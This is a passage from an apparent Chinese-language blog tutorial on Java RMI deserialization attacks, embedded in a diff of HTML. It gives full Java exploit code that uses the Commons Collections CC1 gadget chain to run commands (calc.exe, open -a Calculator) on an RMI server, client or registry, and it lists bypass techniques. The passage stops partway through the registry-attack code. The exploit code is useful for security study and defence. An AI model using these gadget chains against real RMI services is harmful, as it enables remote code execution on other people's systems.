+<span class="kn">import</span> <span class="nn">java.rmi.NotBoundException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">client</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="s">&#34;192.168.31.158&#34;</span><span class="o">,</span><span class="n">1099</span><span class="o">);</span>
+            <span class="n">user</span> <span class="n">hello</span> <span class="o">=</span> <span class="o">(</span><span class="n">user</span><span class="o">)</span> <span class="n">registry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;hello&#34;</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">hello</span><span class="o">.</span><span class="na">hello</span><span class="o">());</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NotBoundException</span> <span class="o">|</span> <span class="n">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h3 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="anchor-link">#</a><a href="#contents:客户端攻击服务端" class="headings">客户端攻击服务端</a></h3>
+<p>使用RMI进行反序列化攻击需要满足两个条件: 调用的方法接收Object类型的参数、服务器端存在利用链。</p>
+<p>对上面代码做点改动，接口中hello方法支持Object类型参数。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">interface</span> <span class="nc">user</span> <span class="kd">extends</span> <span class="n">Remote</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">(</span><span class="n">Object</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>实现类hello方法也添加Object类型参数</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">(</span><span class="n">Object</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;hello方法被调用&#34;</span><span class="o">);</span>
+        <span class="k">return</span> <span class="s">&#34;hello,world&#34;</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>客户端调用远程对象的hello方法，并传入参数，即可在服务器端执行命令。 (利用cc1的setvalue链)</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmiserver</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.lang.annotation.Retention</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">client</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span><span class="o">{</span>
+           <span class="c1">//获取注册中心对象
+</span><span class="c1"></span>            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="s">&#34;localhost&#34;</span><span class="o">,</span> <span class="n">1099</span><span class="o">);</span>
+            <span class="c1">//利用注册中心去查询远程注册表中名为hello的对象
+</span><span class="c1"></span>            <span class="n">user</span> <span class="n">hello</span> <span class="o">=</span> <span class="o">(</span><span class="n">user</span><span class="o">)</span> <span class="n">registry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;hello&#34;</span><span class="o">);</span>
+            <span class="c1">//向服务端调用远程方法
+</span><span class="c1"></span>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">hello</span><span class="o">.</span><span class="na">hello</span><span class="o">(</span><span class="n">getpayload</span><span class="o">()));</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">getpayload</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;calc.exe&#34;</span><span class="o">})</span>
+        <span class="o">};</span>
+        <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+
+        <span class="n">Map</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;value&#34;</span><span class="o">,</span> <span class="s">&#34;sijidou&#34;</span><span class="o">);</span>
+        <span class="n">Map</span> <span class="n">transformedMap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
+
+        <span class="n">Class</span> <span class="n">cl</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="o">);</span>
+        <span class="n">Constructor</span> <span class="n">ctor</span> <span class="o">=</span> <span class="n">cl</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">ctor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">instance</span> <span class="o">=</span> <span class="n">ctor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Retention</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">transformedMap</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">instance</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>在实际使用场景很少有参数是Object类型的，而攻击者可以完全操作客户端，因此可以用恶意对象替换从Object类派生的参数(例如String)，具体有如下四种bypass的思路</p>
+<ul>
+<li>将java.rmi包的代码复制到新包，并在新包中修改相应的代码</li>
+<li>将调试器附加到正在运行的客户端，并在序列化之前替换这些对象</li>
+<li>使用诸如Javassist这样的工具修改字节码</li>
+<li>通过实现代理替换网络流上已经序列化的对象</li>
+</ul>
+<p>详情可参考：https://paper.seebug.org/1194/#objectjep290</p>
+<h3 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="anchor-link">#</a><a href="#contents:服务端攻击客户端" class="headings">服务端攻击客户端</a></h3>
+<p>跟客户端攻击服务端一样，在客户端调用一个远程方法时，只需要控制返回的对象是一个恶意对象就可以了。服务端hello方法的返回结果中包含恶意对象，客户端调用了该方法时进行反序列化。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">Object</span> <span class="nf">hello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+    <span class="n">Object</span> <span class="n">evalObject</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]</span> <span class="o">{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]</span> <span class="o">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span><span class="s">&#34;open -a Calculator&#34;</span><span class="o">})</span>
+        <span class="o">};</span>
+        <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+        <span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">innerMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;value&#34;</span><span class="o">,</span> <span class="s">&#34;Threezh1&#34;</span><span class="o">);</span>
+        <span class="n">Map</span> <span class="n">outerMap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
+        <span class="n">Class</span> <span class="n">AnnotationInvocationHandlerClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="o">);</span>
+        <span class="n">Constructor</span> <span class="n">cons</span> <span class="o">=</span> <span class="n">AnnotationInvocationHandlerClass</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">cons</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">evalObject</span> <span class="o">=</span> <span class="n">cons</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">Retention</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">outerMap</span><span class="o">);</span>
+    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="n">evalObject</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h3 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="anchor-link">#</a><a href="#contents:客户端攻击注册中心" class="headings">客户端攻击注册中心</a></h3>
+<ol>
+<li>
+<p>方法一 <strong>（受JEP 290影响）</strong></p>
+<p>lookup和unbind只接收一个String类型的参数，不能直接传递一个对象反序列化。而注册中心在处理lookup请求时，是直接进行反序列化再进行类型转换。</p>
+<p><img src="/images/1635065384.png" alt=""></p>
+<p>只需要模仿lookup中发送请求的流程，就能够控制发送过去的值为一个对象。</p>
+<p><strong>代码实现</strong></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmiserver</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">sun.rmi.server.UnicastRef</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutput</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.server.Operation</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.server.RemoteCall</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.server.RemoteObject</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">client</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;calc.exe&#34;</span><span class="o">})</span>
+        <span class="o">};</span>
+        <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+        <span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">innerMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;value&#34;</span><span class="o">,</span> <span class="s">&#34;Threezh1&#34;</span><span class="o">);</span>
+        <span class="n">Map</span> <span class="n">outerMap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
+        <span class="n">Class</span> <span class="n">AnnotationInvocationHandlerClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="o">);</span>
+        <span class="n">Constructor</span> <span class="n">cons</span> <span class="o">=</span> <span class="n">AnnotationInvocationHandlerClass</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">cons</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">InvocationHandler</span> <span class="n">evalObject</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">cons</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">Retention</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">outerMap</span><span class="o">);</span>
+        <span class="n">Remote</span> <span class="n">proxyEvalObject</span> <span class="o">=</span> <span class="n">Remote</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">cast</span><span class="o">(</span><span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">Remote</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Remote</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">evalObject</span><span class="o">));</span>
+        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">3333</span><span class="o">);</span>
+        <span class="n">Registry</span> <span class="n">registry_remote</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="o">,</span> <span class="n">3333</span><span class="o">);</span>
+
+        <span class="c1">// 获取super.ref
+</span><span class="c1"></span>        <span class="n">Field</span><span class="o">[]</span> <span class="n">fields_0</span> <span class="o">=</span> <span class="n">registry_remote</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredFields</span><span class="o">();</span>
+        <span class="n">fields_0</span><span class="o">[</span><span class="n">0</span><span class="o">].</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">UnicastRef</span> <span class="n">ref</span> <span class="o">=</span> <span class="o">(</span><span class="n">UnicastRef</span><span class="o">)</span> <span class="n">fields_0</span><span class="o">[</span><span class="n">0</span><span class="o">].</span><span class="na">get</span><span class="o">(</span><span class="n">registry_remote</span><span class="o">);</span>
+
+        <span class="c1">// 获取operations
+</span><span class="c1"></span>        <span class="n">Field</span><span class="o">[]</span> <span class="n">fields_1</span> <span class="o">=</span> <span class="n">registry_remote</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredFields</span><span class="o">();</span>
+        <span class="n">fields_1</span><span class="o">[</span><span class="n">0</span><span class="o">].</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
